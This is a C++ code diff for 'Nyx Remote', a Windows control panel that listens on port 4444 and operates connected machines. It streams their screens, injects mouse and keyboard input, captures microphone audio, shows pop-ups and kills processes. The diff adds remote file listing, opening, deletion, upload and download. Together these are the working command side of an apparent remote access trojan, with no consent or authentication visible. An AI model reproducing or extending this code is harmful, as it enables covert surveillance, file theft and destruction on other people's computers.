@@ -6,6 +6,7 @@
 #include <uxtheme.h>
 #include <mmdeviceapi.h>
 #include <audioclient.h>
+#include <commdlg.h>
 #include <string>
 #include <vector>
 #include <thread>
@@ -18,12 +19,14 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "uxtheme.lib")
+#pragma comment(lib, "comdlg32.lib")
+#pragma comment(lib, "shell32.lib")
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 const int PORT=4444;
 const int PANEL_W=264;
 
-enum ChannelType { CH_MAIN=0, CH_AUDIO=1, CH_DEVLIST=2, CH_DIALOG=3, CH_PROCLIST=4 };
+enum ChannelType { CH_MAIN=0, CH_AUDIO=1, CH_DEVLIST=2, CH_DIALOG=3, CH_PROCLIST=4, CH_FILE=5 };
 
 #ifndef WAVE_FORMAT_PCM
 #define WAVE_FORMAT_PCM 1
@@ -35,6 +38,7 @@ static const GUID SUBTYPE_PCM={0x00000001,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x0
 #define MY_GET_Y_LPARAM(lp) ((int)(short)(HIWORD(lp)))
 
 static std::vector<BYTE> g_Frame; static std::mutex g_FrameLock;
+static Gdiplus::Bitmap* g_DecodedFrame = nullptr; static std::mutex g_DecodedLock;
 static SOCKET g_Client=INVALID_SOCKET; static std::mutex g_SockLock;
 
 struct ClientInfo { SOCKET sock; std::string name; };
@@ -48,7 +52,11 @@ static HWND g_hPcAudioChk,g_hMicChk,g_hMicCombo;
 static HWND g_hMsgEdit,g_hBtnCombo,g_hBtnEdit1,g_hBtnEdit2,g_hBtnEdit3,g_hSendPopup,g_hResponse;
 static HWND g_hFullCtrlChk;
 static HWND g_hProcList,g_hProcRefresh,g_hProcKill;
+static HWND g_hPathEdit, g_hFileList, g_hFileRefresh, g_hFileDelete, g_hFileOpen, g_hFileUpload, g_hFileDownload;
 static std::vector<std::string> g_Sounds,g_MicDevs; static std::vector<DWORD> g_ProcPIDs;
+static std::vector<std::pair<std::string, bool>> g_FileList;
+static std::vector<int64_t> g_FileSizes;
+static std::string g_CurrentPath = "C:\\";
 static bool g_PcAudioOn=false,g_MicOn=false,g_FullCtrl=false;
 
 static int g_ImgW=0,g_ImgH=0,g_DispX=0,g_DispY=0,g_DispW=0,g_DispH=0;
@@ -67,7 +75,9 @@ enum { ID_SLIDER=101,ID_LISTBOX=102,ID_PLAY=103,ID_STOP=107,
        ID_MSG_EDIT=108,ID_BTN_COMBO=109,ID_BTN_EDIT1=110,ID_BTN_EDIT2=111,ID_BTN_EDIT3=112,
        ID_SEND_POPUP=113,ID_PROC_LIST=114,ID_PROC_REFRESH=115,ID_PROC_KILL=116,ID_FULL_CTRL=117,
        ID_PC_COMBO=118,
-       WM_DEVLIST=WM_USER+1,WM_DIALOG_RESP=WM_USER+2,WM_PROCLIST=WM_USER+3,WM_CLIENTLIST=WM_USER+4 };
+       ID_PATH_EDIT=120, ID_FILE_LIST=121, ID_FILE_REFRESH=122, ID_FILE_DELETE=123, ID_FILE_OPEN=124, ID_FILE_UPLOAD=125, ID_FILE_DOWNLOAD=126,
+       WM_DEVLIST=WM_USER+1,WM_DIALOG_RESP=WM_USER+2,WM_PROCLIST=WM_USER+3,WM_CLIENTLIST=WM_USER+4,
+       WM_FILELIST=WM_USER+5, WM_FILEDOWNLOAD=WM_USER+6 };
 
 bool RecvAll(SOCKET s,char*d,int len){int t=0;while(t<len){int n=recv(s,d+t,len-t,0);if(n<=0)return false;t+=n;}return true;}
 
@@ -80,6 +90,77 @@ bool SendMic(bool on,int di){std::lock_guard<std::mutex>lk(g_SockLock);if(g_Clie
 bool SendPlay(const std::string&f){std::ifstream in(f,std::ios::binary|std::ios::ate);if(!in)return false;int sz=(int)in.tellg();in.seekg(0);std::vector<char>buf(sz);in.read(buf.data(),sz);std::lock_guard<std::mutex>lk(g_SockLock);if(g_Client==INVALID_SOCKET)return false;if(send(g_Client,"P",1,0)!=1)return false;if(send(g_Client,(char*)&sz,sizeof(sz),0)!=sizeof(sz))return false;if(send(g_Client,buf.data(),sz,0)!=sz)return false;return true;}
 bool SendDialog(const std::string&msg,const std::vector<std::string>&btns){std::lock_guard<std::mutex>lk(g_SockLock);if(g_Client==INVALID_SOCKET)return false;if(send(g_Client,"D",1,0)!=1)return false;int ml=(int)msg.size();send(g_Client,(char*)&ml,4,0);if(ml>0)send(g_Client,msg.c_str(),ml,0);int nb=(int)btns.size();send(g_Client,(char*)&nb,4,0);for(auto&b:btns){int bl=(int)b.size();send(g_Client,(char*)&bl,4,0);if(bl>0)send(g_Client,b.c_str(),bl,0);}return true;}
 bool SendKill(DWORD pid){return SendCmd('K',(char*)&pid,sizeof(pid));}
+
+bool SendFileList(const std::string& path) {
+    std::lock_guard<std::mutex> lk(g_SockLock);
+    if (g_Client == INVALID_SOCKET) return false;
+    char cmd[2] = {'I', 'L'};
+    if (send(g_Client, cmd, 2, 0) != 2) return false;
+    int pl = (int)path.size();
+    if (send(g_Client, (char*)&pl, 4, 0) != 4) return false;
+    if (pl > 0 && send(g_Client, path.c_str(), pl, 0) != pl) return false;
+    return true;
+}
+
+bool SendFileDelete(const std::string& path) {
+    std::lock_guard<std::mutex> lk(g_SockLock);
+    if (g_Client == INVALID_SOCKET) return false;
+    char cmd[2] = {'I', 'D'};
+    if (send(g_Client, cmd, 2, 0) != 2) return false;
+    int pl = (int)path.size();
+    send(g_Client, (char*)&pl, 4, 0);
+    if (pl > 0) send(g_Client, path.c_str(), pl, 0);
+    return true;
+}
+
+bool SendFileOpen(const std::string& path) {
+    std::lock_guard<std::mutex> lk(g_SockLock);
+    if (g_Client == INVALID_SOCKET) return false;
+    char cmd[2] = {'I', 'O'};
+    if (send(g_Client, cmd, 2, 0) != 2) return false;
+    int pl = (int)path.size();
+    send(g_Client, (char*)&pl, 4, 0);
+    if (pl > 0) send(g_Client, path.c_str(), pl, 0);
+    return true;
+}
+
+bool SendFileUpload(const std::string& localPath, const std::string& remotePath) {
+    std::ifstream in(localPath, std::ios::binary | std::ios::ate);
+    if (!in) return false;
+    int64_t fsize = in.tellg();
+    in.seekg(0);
+    
+    std::lock_guard<std::mutex> lk(g_SockLock);
+    if (g_Client == INVALID_SOCKET) return false;
+    
+    char cmd[2] = {'I', 'U'};
+    if (send(g_Client, cmd, 2, 0) != 2) return false;
+    int pl = (int)remotePath.size();
+    send(g_Client, (char*)&pl, 4, 0);
+    if (pl > 0) send(g_Client, remotePath.c_str(), pl, 0);
+    
+    send(g_Client, (char*)&fsize, 8, 0);
+    
+    char buf[65536];
+    while (fsize > 0) {
+        int toRead = (fsize > sizeof(buf)) ? sizeof(buf) : (int)fsize;
+        in.read(buf, toRead);
+        if (send(g_Client, buf, toRead, 0) != toRead) return false;
+        fsize -= toRead;
+    }
+    return true;
+}
+
+bool SendFileDownload(const std::string& remotePath) {
+    std::lock_guard<std::mutex> lk(g_SockLock);
+    if (g_Client == INVALID_SOCKET) return false;
+    char cmd[2] = {'I', 'W'};
+    if (send(g_Client, cmd, 2, 0) != 2) return false;
+    int pl = (int)remotePath.size();
+    send(g_Client, (char*)&pl, 4, 0);
+    if (pl > 0) send(g_Client, remotePath.c_str(), pl, 0);
+    return true;
+}
 
 bool SendMouseMove(int x,int y){std::lock_guard<std::mutex>lk(g_SockLock);if(g_Client==INVALID_SOCKET)return false;char b[9]={'m'};memcpy(b+1,&x,4);memcpy(b+5,&y,4);return send(g_Client,b,9,0)==9;}
 bool SendMouseClick(char btn,char act){std::lock_guard<std::mutex>lk(g_SockLock);if(g_Client==INVALID_SOCKET)return false;char b[3]={'c',btn,act};return send(g_Client,b,3,0)==3;}
@@ -104,13 +185,32 @@ void ClientFrameReader(SOCKET cli){
         if(!RecvAll(cli,(char*)buf.data(),len))break;
         bool isActive=false;
         {std::lock_guard<std::mutex>lk(g_SockLock);if(g_Client==cli)isActive=true;}
-        if(isActive){std::lock_guard<std::mutex>lk(g_FrameLock);g_Frame=std::move(buf);}
+        if(isActive){
+            std::lock_guard<std::mutex>lk(g_FrameLock);
+            g_Frame=std::move(buf);
+            
+            if(!g_Frame.empty()){
+                HGLOBAL hM=GlobalAlloc(GMEM_MOVEABLE,g_Frame.size());
+                void*p=GlobalLock(hM);
+                memcpy(p,g_Frame.data(),g_Frame.size());
+                GlobalUnlock(hM);
+                IStream*strm=0;
+                CreateStreamOnHGlobal(hM,TRUE,&strm);
+                Gdiplus::Bitmap*newBmp=Gdiplus::Bitmap::FromStream(strm);
+                strm->Release();
+                
+                std::lock_guard<std::mutex>dlk(g_DecodedLock);
+                if(g_DecodedFrame)delete g_DecodedFrame;
+                g_DecodedFrame=newBmp;
+            }
+            InvalidateRect(g_hWnd,NULL,FALSE);
+        }
     }
     {
         std::lock_guard<std::mutex>lk(g_ClientListLock);
         for(auto it=g_ClientList.begin();it!=g_ClientList.end();++it){
             if(it->sock==cli){g_ClientList.erase(it);break;}
-            }
+        }
         std::lock_guard<std::mutex>slk(g_SockLock);
         if(g_Client==cli){
             g_Client=INVALID_SOCKET;
@@ -127,8 +227,6 @@ void ClientFrameReader(SOCKET cli){
     RefreshStatus();
     closesocket(cli);
 }
-
-// ---------- Channel handlers (replace the old per-port listener threads) ----------
 
 void HandleMainClient(SOCKET cli){
     int hlen;
@@ -147,7 +245,7 @@ void HandleMainClient(SOCKET cli){
         }
     }
     PostMessage(g_hWnd, WM_CLIENTLIST, 0, 0);
-    ClientFrameReader(cli); // blocking; runs for life of this connection
+    ClientFrameReader(cli);
 }
 
 void HandleAudioClient(SOCKET cli){
@@ -263,7 +361,61 @@ void HandleProcListClient(SOCKET cli){
     closesocket(cli);
 }
 
-// Single listener: accepts connections, reads a 1-byte channel ID, dispatches.
+void HandleFileClient(SOCKET cli) {
+    int type;
+    if (!RecvAll(cli, (char*)&type, 4)) { closesocket(cli); return; }
+    
+    if (type == 0) {
+        int c;
+        if (!RecvAll(cli, (char*)&c, 4)) { closesocket(cli); return; }
+        g_FileList.clear();
+        g_FileSizes.clear();
+        for (int i = 0; i < c && i < 10000; i++) {
+            int is_dir;
+            if (!RecvAll(cli, (char*)&is_dir, 4)) break;
+            int nl;
+            if (!RecvAll(cli, (char*)&nl, 4) || nl < 0 || nl > 1024) break;
+            std::string name;
+            if (nl > 0) {
+                std::vector<char> buf(nl + 1);
+                if (!RecvAll(cli, buf.data(), nl)) break;
+                buf[nl] = 0;
+                name = std::string(buf.data());
+            }
+            int64_t size;
+            if (!RecvAll(cli, (char*)&size, 8)) break;
+            
+            g_FileList.push_back({name, is_dir != 0});
+            g_FileSizes.push_back(size);
+        }
+        PostMessage(g_hWnd, WM_FILELIST, 0, 0);
+    } else if (type == 1) {
+        int64_t fsize;
+        if (!RecvAll(cli, (char*)&fsize, 8)) { closesocket(cli); return; }
+        if (fsize < 0) {
+            MessageBoxA(g_hWnd, "File not found or access denied.", "Download Error", MB_ICONERROR);
+        } else {
+            CreateDirectoryA("nyx_downloads", NULL);
+            std::string savePath = "nyx_downloads\\nyx_download_" + std::to_string(GetTickCount());
+            
+            std::ofstream out(savePath, std::ios::binary);
+            if (out.is_open()) {
+                int64_t remaining = fsize;
+                char buf[65536];
+                while (remaining > 0) {
+                    int toRead = (remaining > sizeof(buf)) ? sizeof(buf) : (int)remaining;
+                    if (!RecvAll(cli, buf, toRead)) break;
+                    out.write(buf, toRead);
+                    remaining -= toRead;
+                }
+                out.close();
+                PostMessageA(g_hWnd, WM_FILEDOWNLOAD, 0, (LPARAM)new std::string(savePath));
+            }
+        }
+    }
+    closesocket(cli);
+}
+
 void ListenerThread(){
     SOCKET srv=socket(AF_INET,SOCK_STREAM,0);BOOL r=TRUE;setsockopt(srv,SOL_SOCKET,SO_REUSEADDR,(char*)&r,sizeof(r));
     sockaddr_in a{};a.sin_family=AF_INET;a.sin_port=htons(PORT);a.sin_addr.s_addr=INADDR_ANY;
@@ -279,6 +431,7 @@ void ListenerThread(){
             case CH_DEVLIST:  std::thread(HandleDevListClient,cli).detach(); break;
             case CH_DIALOG:   std::thread(HandleDialogClient,cli).detach(); break;
             case CH_PROCLIST: std::thread(HandleProcListClient,cli).detach(); break;
+            case CH_FILE:     std::thread(HandleFileClient,cli).detach(); break;
             default: closesocket(cli); break;
         }
     }
@@ -324,12 +477,26 @@ void BuildControls(HWND hwnd){
     HWND hPR=CreateWindowExW(0,L"STATIC",L"PROCESSES",WS_CHILD|WS_VISIBLE|SS_LEFT,x,y,w,16,hwnd,0,0,0);SendMessage(hPR,WM_SETFONT,(WPARAM)s_fontLabel,0);y+=20;
     g_hProcList=CreateWindowExW(WS_EX_STATICEDGE,L"LISTBOX",L"",WS_CHILD|WS_VISIBLE|WS_VSCROLL|LBS_NOTIFY|LBS_NOINTEGRALHEIGHT,x,y,w,120,hwnd,(HMENU)ID_PROC_LIST,0,0);SendMessage(g_hProcList,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hProcList,L"",L"");y+=128;
     int tw=(w-12)/3;g_hProcRefresh=CreateWindowExW(0,L"BUTTON",L"\u21BB  Refresh",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,x,y,tw*2+6,28,hwnd,(HMENU)ID_PROC_REFRESH,0,0);SendMessage(g_hProcRefresh,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hProcRefresh,L"",L"");
-    g_hProcKill=CreateWindowExW(0,L"BUTTON",L"\u2716  Kill",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,x+tw*2+12,y,tw,28,hwnd,(HMENU)ID_PROC_KILL,0,0);SendMessage(g_hProcKill,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hProcKill,L"",L"");
+    g_hProcKill=CreateWindowExW(0,L"BUTTON",L"\u2716  Kill",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,x+tw*2+12,y,tw,28,hwnd,(HMENU)ID_PROC_KILL,0,0);SendMessage(g_hProcKill,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hProcKill,L"",L"");y+=40;
+
+    // File Manager UI
+    HWND hFM=CreateWindowExW(0,L"STATIC",L"FILE MANAGER",WS_CHILD|WS_VISIBLE|SS_LEFT,x,y,w,16,hwnd,0,0,0);SendMessage(hFM,WM_SETFONT,(WPARAM)s_fontLabel,0);y+=20;
+    g_hPathEdit=CreateWindowExW(WS_EX_STATICEDGE,L"EDIT",L"C:\\",WS_CHILD|WS_VISIBLE|ES_AUTOHSCROLL,x,y,w,22,hwnd,(HMENU)ID_PATH_EDIT,0,0);SendMessage(g_hPathEdit,WM_SETFONT,(WPARAM)s_fontSmall,0);y+=28;
+    g_hFileList=CreateWindowExW(WS_EX_STATICEDGE,L"LISTBOX",L"",WS_CHILD|WS_VISIBLE|WS_VSCROLL|LBS_NOTIFY|LBS_NOINTEGRALHEIGHT,x,y,w,160,hwnd,(HMENU)ID_FILE_LIST,0,0);SendMessage(g_hFileList,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hFileList,L"",L"");y+=168;
+    
+    int fw=(w-12)/2;
+    g_hFileRefresh=CreateWindowExW(0,L"BUTTON",L"\u21BB Refresh",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,x,y,fw,28,hwnd,(HMENU)ID_FILE_REFRESH,0,0);SendMessage(g_hFileRefresh,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hFileRefresh,L"",L"");
+    g_hFileOpen=CreateWindowExW(0,L"BUTTON",L"\u25B6 Open",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,x+fw+12,y,fw,28,hwnd,(HMENU)ID_FILE_OPEN,0,0);SendMessage(g_hFileOpen,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hFileOpen,L"",L"");y+=34;
+    
+    g_hFileDelete=CreateWindowExW(0,L"BUTTON",L"\u2716 Delete",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,x,y,fw,28,hwnd,(HMENU)ID_FILE_DELETE,0,0);SendMessage(g_hFileDelete,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hFileDelete,L"",L"");
+    g_hFileDownload=CreateWindowExW(0,L"BUTTON",L"\u2B07 Download",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,x+fw+12,y,fw,28,hwnd,(HMENU)ID_FILE_DOWNLOAD,0,0);SendMessage(g_hFileDownload,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hFileDownload,L"",L"");y+=34;
+    
+    g_hFileUpload=CreateWindowExW(0,L"BUTTON",L"\u2B06 Upload",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,x,y,w,28,hwnd,(HMENU)ID_FILE_UPLOAD,0,0);SendMessage(g_hFileUpload,WM_SETFONT,(WPARAM)s_fontSmall,0);SetWindowTheme(g_hFileUpload,L"",L"");
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp){
     switch(msg){
-    case WM_CREATE:BuildControls(hwnd);SetTimer(hwnd,1,80,NULL);return 0;
+    case WM_CREATE:BuildControls(hwnd);return 0;
     case WM_ERASEBKGND:{HDC hdc=(HDC)wp;RECT rc;GetClientRect(hwnd,&rc);RECT p={0,0,PANEL_W,rc.bottom},d={PANEL_W,0,rc.right,rc.bottom};FillRect(hdc,&p,s_brPanel);FillRect(hdc,&d,s_brDisplay);HPEN pen=CreatePen(PS_SOLID,1,C_LINE),old=(HPEN)SelectObject(hdc,pen);MoveToEx(hdc,PANEL_W,0,NULL);LineTo(hdc,PANEL_W,rc.bottom);SelectObject(hdc,old);DeleteObject(pen);return 1;}
     case WM_CTLCOLORSTATIC:{HDC hdc=(HDC)wp;HWND ctl=(HWND)lp;if(ctl==g_hStatus){bool ok;{std::lock_guard<std::mutex>lk(g_SockLock);ok=(g_Client!=INVALID_SOCKET);}SetTextColor(hdc,ok?C_GREEN:C_AMBER);}else if(ctl==g_hResponse)SetTextColor(hdc,C_CYAN);else SetTextColor(hdc,C_TEXT);SetBkMode(hdc,TRANSPARENT);return(LRESULT)s_brPanel;}
     case WM_CTLCOLORLISTBOX:{HDC hdc=(HDC)wp;SetTextColor(hdc,C_TEXT);SetBkColor(hdc,C_LISTBG);return(LRESULT)s_brList;}
@@ -370,6 +537,45 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp){
                 }
             }
         }
+        else if(id==ID_FILE_REFRESH){
+            char path[MAX_PATH]={};GetWindowTextA(g_hPathEdit,path,MAX_PATH);g_CurrentPath=path;SendFileList(g_CurrentPath);
+        }
+        else if(id==ID_FILE_LIST&&HIWORD(wp)==LBN_DBLCLK){
+            int sel=(int)SendMessageA(g_hFileList,LB_GETCURSEL,0,0);
+            if(sel!=LB_ERR&&sel<(int)g_FileList.size()){
+                std::string name=g_FileList[sel].first;bool isDir=g_FileList[sel].second;
+                std::string newPath=g_CurrentPath;if(!newPath.empty()&&newPath.back()!='\\')newPath+="\\";newPath+=name;
+                if(isDir){SetWindowTextA(g_hPathEdit,newPath.c_str());g_CurrentPath=newPath;SendFileList(g_CurrentPath);}
+                else{SendFileOpen(newPath);}
+            }
+        }
+        else if(id==ID_FILE_OPEN){
+            int sel=(int)SendMessageA(g_hFileList,LB_GETCURSEL,0,0);
+            if(sel!=LB_ERR&&sel<(int)g_FileList.size()){
+                std::string fullPath=g_CurrentPath;if(!fullPath.empty()&&fullPath.back()!='\\')fullPath+="\\";fullPath+=g_FileList[sel].first;SendFileOpen(fullPath);
+            }
+        }
+        else if(id==ID_FILE_DELETE){
+            int sel=(int)SendMessageA(g_hFileList,LB_GETCURSEL,0,0);
+            if(sel!=LB_ERR&&sel<(int)g_FileList.size()){
+                std::string fullPath=g_CurrentPath;if(!fullPath.empty()&&fullPath.back()!='\\')fullPath+="\\";fullPath+=g_FileList[sel].first;
+                if(MessageBoxA(g_hWnd,("Delete "+fullPath+"?").c_str(),"Confirm",MB_YESNO)==IDYES){SendFileDelete(fullPath);Sleep(200);SendFileList(g_CurrentPath);}
+            }
+        }
+        else if(id==ID_FILE_DOWNLOAD){
+            int sel=(int)SendMessageA(g_hFileList,LB_GETCURSEL,0,0);
+            if(sel!=LB_ERR&&sel<(int)g_FileList.size()&&!g_FileList[sel].second){
+                std::string fullPath=g_CurrentPath;if(!fullPath.empty()&&fullPath.back()!='\\')fullPath+="\\";fullPath+=g_FileList[sel].first;SendFileDownload(fullPath);
+            }
+        }
+        else if(id==ID_FILE_UPLOAD){
+            char filePath[MAX_PATH]={};OPENFILENAMEA ofn={};ofn.lStructSize=sizeof(ofn);ofn.hwndOwner=g_hWnd;ofn.lpstrFilter="All Files\0*.*\0";ofn.lpstrFile=filePath;ofn.nMaxFile=MAX_PATH;ofn.Flags=OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST;
+            if(GetOpenFileNameA(&ofn)){
+                std::string localPath=filePath;std::string fileName=localPath;size_t pos=fileName.find_last_of("\\/");if(pos!=std::string::npos)fileName=fileName.substr(pos+1);
+                std::string remotePath=g_CurrentPath;if(!remotePath.empty()&&remotePath.back()!='\\')remotePath+="\\";remotePath+=fileName;
+                SendFileUpload(localPath,remotePath);Sleep(500);SendFileList(g_CurrentPath);
+            }
+        }
         return 0;}
     case WM_DIALOG_RESP:{char*r=(char*)lp;SetWindowTextA(g_hResponse,r);delete[]r;return 0;}
     case WM_PROCLIST:{int c=(int)wp;char**arr=(char**)lp;SendMessageA(g_hProcList,LB_RESETCONTENT,0,0);for(int i=0;i<c;i++){SendMessageA(g_hProcList,LB_ADDSTRING,0,(LPARAM)arr[i]);delete[]arr[i];}delete[]arr;return 0;}
@@ -388,6 +594,27 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp){
         return 0;
     }
     case WM_DEVLIST:SendMessageA(g_hMicCombo,CB_RESETCONTENT,0,0);for(auto&d:g_MicDevs)SendMessageA(g_hMicCombo,CB_ADDSTRING,0,(LPARAM)d.c_str());if(!g_MicDevs.empty())SendMessageA(g_hMicCombo,CB_SETCURSEL,0,0);EnableWindow(g_hMicChk,!g_MicDevs.empty());EnableWindow(g_hMicCombo,!g_MicDevs.empty());return 0;
+    
+    case WM_FILELIST:{
+        SendMessageA(g_hFileList,LB_RESETCONTENT,0,0);
+        for(size_t i=0;i<g_FileList.size();i++){
+            std::string display=g_FileList[i].first;
+            if(g_FileList[i].second){display="[DIR] "+display;}
+            else{
+                display="      "+display;int64_t sz=g_FileSizes[i];
+                if(sz>1024*1024)display+=" ("+std::to_string(sz/(1024*1024))+" MB)";
+                else if(sz>1024)display+=" ("+std::to_string(sz/1024)+" KB)";
+                else display+=" ("+std::to_string(sz)+" B)";
+            }
+            SendMessageA(g_hFileList,LB_ADDSTRING,0,(LPARAM)display.c_str());
+        }
+        return 0;
+    }
+    case WM_FILEDOWNLOAD:{
+        std::string*path=(std::string*)lp;
+        MessageBoxA(g_hWnd,("File downloaded to: "+*path).c_str(),"Success",MB_ICONINFORMATION);
+        delete path;return 0;
+    }
 
     case WM_LBUTTONDOWN:case WM_RBUTTONDOWN:case WM_MBUTTONDOWN:
         if(g_FullCtrl){int nx,ny;if(MapMouse(lp,nx,ny)){SetCapture(hwnd);g_MouseCaptured=true;SetFocus(hwnd);SendMouseMove(nx,ny);char btn=(msg==WM_LBUTTONDOWN)?0:(msg==WM_RBUTTONDOWN)?1:2;SendMouseClick(btn,0);}}break;
@@ -403,18 +630,26 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp){
     case WM_KEYUP:case WM_SYSKEYUP:
         if(g_FullCtrl){SendKey((DWORD)wp,1);}break;
 
-    case WM_TIMER:InvalidateRect(hwnd,NULL,FALSE);return 0;
     case WM_PAINT:{
         PAINTSTRUCT ps;HDC hdc=BeginPaint(hwnd,&ps);RECT rc;GetClientRect(hwnd,&rc);
-        std::vector<BYTE>frame;{std::lock_guard<std::mutex>lk(g_FrameLock);frame=g_Frame;}
-        if(!frame.empty()){HGLOBAL hM=GlobalAlloc(GMEM_MOVEABLE,frame.size());void*p=GlobalLock(hM);memcpy(p,frame.data(),frame.size());GlobalUnlock(hM);IStream*strm=0;CreateStreamOnHGlobal(hM,TRUE,&strm);Gdiplus::Bitmap*bmp=Gdiplus::Bitmap::FromStream(strm);
-        if(bmp&&bmp->GetLastStatus()==Gdiplus::Ok){int bw=bmp->GetWidth(),bh=bmp->GetHeight(),pad=10;int ax=PANEL_W+pad,ay=pad,aw=rc.right-ax-pad,ah=rc.bottom-ay-pad;if(aw>0&&ah>0&&bw>0&&bh>0){float sc=min((float)aw/bw,(float)ah/bh);int dw=(int)(bw*sc),dh=(int)(bh*sc);int dx=ax+(aw-dw)/2,dy=ay+(ah-dh)/2;
-        g_ImgW=bw;g_ImgH=bh;g_DispX=dx;g_DispY=dy;g_DispW=dw;g_DispH=dh;
-        Gdiplus::Graphics g(hdc);Gdiplus::SolidBrush br(Gdiplus::Color(20,20,24));g.FillRectangle(&br,dx-2,dy-2,dw+4,dh+4);g.DrawImage(bmp,dx,dy,dw,dh);
-        if(g_FullCtrl){Gdiplus::Pen pen(Gdiplus::Color(220,80,80),2);g.DrawRectangle(&pen,dx-1,dy-1,dw+2,dh+2);}}}delete bmp;strm->Release();}
-        else{g_ImgW=0;SetBkMode(hdc,TRANSPARENT);SetTextColor(hdc,C_DIM);HFONT old=(HFONT)SelectObject(hdc,s_fontLabel);const char*t="Waiting for screen data...";TextOutA(hdc,PANEL_W+(rc.right-PANEL_W-220)/2,rc.bottom/2-8,t,(int)strlen(t));SelectObject(hdc,old);}
+        Gdiplus::Bitmap*bmp=nullptr;
+        {std::lock_guard<std::mutex>dlk(g_DecodedLock);bmp=g_DecodedFrame;}
+        if(bmp&&bmp->GetLastStatus()==Gdiplus::Ok){
+            int bw=bmp->GetWidth(),bh=bmp->GetHeight(),pad=10;
+            int ax=PANEL_W+pad,ay=pad,aw=rc.right-ax-pad,ah=rc.bottom-ay-pad;
+            if(aw>0&&ah>0&&bw>0&&bh>0){
+                float sc=min((float)aw/bw,(float)ah/bh);int dw=(int)(bw*sc),dh=(int)(bh*sc);int dx=ax+(aw-dw)/2,dy=ay+(ah-dh)/2;
+                g_ImgW=bw;g_ImgH=bh;g_DispX=dx;g_DispY=dy;g_DispW=dw;g_DispH=dh;
+                Gdiplus::Graphics g(hdc);Gdiplus::SolidBrush br(Gdiplus::Color(20,20,24));g.FillRectangle(&br,dx-2,dy-2,dw+4,dh+4);g.DrawImage(bmp,dx,dy,dw,dh);
+                if(g_FullCtrl){Gdiplus::Pen pen(Gdiplus::Color(220,80,80),2);g.DrawRectangle(&pen,dx-1,dy-1,dw+2,dh+2);}
+            }
+        } else {
+            g_ImgW=0;SetBkMode(hdc,TRANSPARENT);SetTextColor(hdc,C_DIM);HFONT old=(HFONT)SelectObject(hdc,s_fontLabel);const char*t="Waiting for screen data...";TextOutA(hdc,PANEL_W+(rc.right-PANEL_W-220)/2,rc.bottom/2-8,t,(int)strlen(t));SelectObject(hdc,old);
+        }
         EndPaint(hwnd,&ps);return 0;}
-    case WM_DESTROY:KillTimer(hwnd,1);PostQuitMessage(0);return 0;
+    case WM_DESTROY:
+        {std::lock_guard<std::mutex>dlk(g_DecodedLock);if(g_DecodedFrame)delete g_DecodedFrame;g_DecodedFrame=nullptr;}
+        PostQuitMessage(0);return 0;
     }
     return DefWindowProc(hwnd,msg,wp,lp);
 }
@@ -425,6 +660,6 @@ int main(){
     WSADATA wsa;if(WSAStartup(MAKEWORD(2,2),&wsa)!=0)return 1;Gdiplus::GdiplusStartupInput gdip;ULONG_PTR gt;Gdiplus::GdiplusStartup(&gt,&gdip,0);INITCOMMONCONTROLSEX icex={sizeof(icex),ICC_BAR_CLASSES};InitCommonControlsEx(&icex);FindMP3s();
     std::thread(ListenerThread).detach();
     WNDCLASSEXA wc={sizeof(wc)};wc.lpfnWndProc=WndProc;wc.hInstance=GetModuleHandle(0);wc.hCursor=LoadCursor(0,IDC_ARROW);wc.lpszClassName="NyxServer";RegisterClassExA(&wc);
-    g_hWnd=CreateWindowExA(0,"NyxServer","Nyx Remote",WS_OVERLAPPEDWINDOW|WS_VSCROLL,CW_USEDEFAULT,0,1040,1020,0,0,wc.hInstance,0);ShowWindow(g_hWnd,SW_SHOW);UpdateWindow(g_hWnd);
+    g_hWnd=CreateWindowExA(0,"NyxServer","Nyx Remote",WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,0,1040,1400,0,0,wc.hInstance,0);ShowWindow(g_hWnd,SW_SHOW);UpdateWindow(g_hWnd);
     MSG msg;while(GetMessage(&msg,0,0,0)){TranslateMessage(&msg);DispatchMessage(&msg);}Gdiplus::GdiplusShutdown(gt);WSACleanup();return 0;
 }
